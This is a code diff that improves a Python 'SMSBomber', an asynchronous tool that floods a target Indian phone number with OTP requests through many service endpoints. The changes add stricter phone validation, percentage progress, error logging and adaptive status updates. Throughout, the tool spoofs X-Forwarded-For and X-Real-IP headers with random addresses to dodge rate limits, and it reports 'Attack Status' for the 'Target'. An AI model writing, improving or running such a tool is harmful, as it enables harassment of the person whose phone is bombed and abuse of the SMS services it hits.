@@ -7,6 +7,8 @@ Async implementation with proper error handling and rate limiting
 import asyncio
 import aiohttp
 import random
+import secrets
+import ssl
 import time
 from dataclasses import dataclass, field
 from typing import Dict, List, Optional, Callable, Any
@@ -28,6 +30,7 @@ class AttackStats:
     end_time: Optional[float] = None
     current_endpoint: str = ""
     errors: List[str] = field(default_factory=list)
+    target_count: int = 0
 
     @property
     def duration(self) -> float:
@@ -44,7 +47,9 @@ class AttackStats:
 
     @property
     def progress_pct(self) -> float:
-        return 0.0
+        if self.target_count <= 0:
+            return 0.0
+        return min(100.0, (self.total / self.target_count) * 100)
 
 
 class RateLimiter:
@@ -91,22 +96,27 @@ class SMSBomber:
         self.count = min(count, rate_limits.MAX_ATTEMPTS_PER_USER)
         self.progress_callback = progress_callback
 
-        self.stats = AttackStats()
+        self.stats = AttackStats(target_count=self.count)
         self._stop_event = asyncio.Event()
         self._lock = asyncio.Lock()
         self._rate_limiter = RateLimiter(rate=2.0, burst=5)
         self._session: Optional[aiohttp.ClientSession] = None
+        self._ssl_context = ssl.create_default_context()
 
     def _normalize_phone(self, phone: str) -> str:
-        """Normalize to +91XXXXXXXXXX format"""
-        digits = ''.join(filter(str.isdigit, phone))
-        if len(digits) == 10:
+        """Normalize to +91XXXXXXXXXX format and reject invalid input."""
+        if not phone:
+            raise ValueError("Phone number is required")
+
+        digits = ''.join(filter(str.isdigit, phone.strip()))
+        if len(digits) == 10 and digits[0] in "6789":
             return f"+91{digits}"
-        elif len(digits) == 12 and digits.startswith("91"):
+        if len(digits) == 12 and digits.startswith("91") and digits[2] in "6789":
             return f"+{digits}"
-        elif len(digits) == 13 and digits.startswith("091"):
+        if len(digits) == 13 and digits.startswith("091") and digits[3] in "6789":
             return f"+{digits[1:]}"
-        return phone
+
+        raise ValueError("Invalid phone number format")
 
     def _format_payload(self, endpoint: OTPEndpoint) -> Dict[str, Any]:
         """Format payload with phone number"""
@@ -132,8 +142,8 @@ class SMSBomber:
 
         # Random forwarded IP
         ip = (
-            f"{random.randint(10, 255)}.{random.randint(0, 255)}"
-            f".{random.randint(0, 255)}.{random.randint(1, 254)}"
+            f"{secrets.randbelow(246) + 10}.{secrets.randbelow(256)}"
+            f".{secrets.randbelow(256)}.{secrets.randbelow(254) + 1}"
         )
         headers["X-Forwarded-For"] = ip
         headers["X-Real-IP"] = ip
@@ -171,7 +181,7 @@ class SMSBomber:
                     params=payload,
                     headers=headers,
                     timeout=timeout,
-                    ssl=False
+                    ssl=self._ssl_context
                 ) as response:
                     success = response.status in (200, 201, 202, 204)
             else:
@@ -181,7 +191,7 @@ class SMSBomber:
                     data=payload if not is_json else None,
                     headers=headers,
                     timeout=timeout,
-                    ssl=False
+                    ssl=self._ssl_context
                 ) as response:
                     success = response.status in (200, 201, 202, 204)
 
@@ -198,6 +208,8 @@ class SMSBomber:
             async with self._lock:
                 self.stats.total += 1
                 self.stats.failed += 1
+                if len(self.stats.errors) < 10:
+                    self.stats.errors.append(f"{endpoint.name}: timeout")
             return False
 
         except aiohttp.ClientError as e:
@@ -212,21 +224,34 @@ class SMSBomber:
             async with self._lock:
                 self.stats.total += 1
                 self.stats.failed += 1
+                if len(self.stats.errors) < 10:
+                    self.stats.errors.append(f"{endpoint.name}: unexpected error")
             logger.error(f"Unexpected error for {endpoint.name}: {e}")
             return False
 
     async def _progress_updater(self):
-        """Background task to send progress updates every 2 seconds"""
-        while not self._stop_event.is_set():
+        """Background task to send adaptive progress updates."""
+        failure_count = 0
+        while not self._stop_event.is_set() and self.stats.total < self.count:
             if self.progress_callback:
                 try:
-                    # Support both sync and async callbacks
                     result = self.progress_callback(self.stats)
                     if asyncio.iscoroutine(result):
                         await result
+                    failure_count = 0
                 except Exception as e:
+                    failure_count += 1
                     logger.error(f"Progress callback error: {e}")
-            await asyncio.sleep(2)
+
+            if self.count <= 20:
+                interval = 1.0
+            elif self.count <= 100:
+                interval = 2.0
+            else:
+                interval = 3.0
+
+            interval = min(8.0, interval * (2 ** min(failure_count, 3)))
+            await asyncio.sleep(interval)
 
     async def start(self) -> AttackStats:
         """Start the SMS bombing attack"""
@@ -280,6 +305,10 @@ class SMSBomber:
                 await asyncio.wait_for(progress_task, timeout=3.0)
             except asyncio.TimeoutError:
                 progress_task.cancel()
+                try:
+                    await progress_task
+                except asyncio.CancelledError:
+                    pass
 
         self.stats.end_time = time.time()
         return self.stats
@@ -303,7 +332,7 @@ class SMSBomber:
         return f"""
 📊 **Attack Status**
 
-{self.get_progress_bar()}
+{self.get_progress_bar()} ({self.stats.progress_pct:.1f}%)
 
 📱 Target: `{self.phone}`
 📤 Sent: {self.stats.total}/{self.count}
@@ -315,7 +344,7 @@ class SMSBomber:
 """
 
 
-def validate_phone(phone: str) -> tuple:
+def validate_phone(phone: str) -> tuple[bool, str]:
     """Validate and normalize Indian phone number"""
     if not phone or not phone.strip():
         return False, "Phone number cannot be empty"
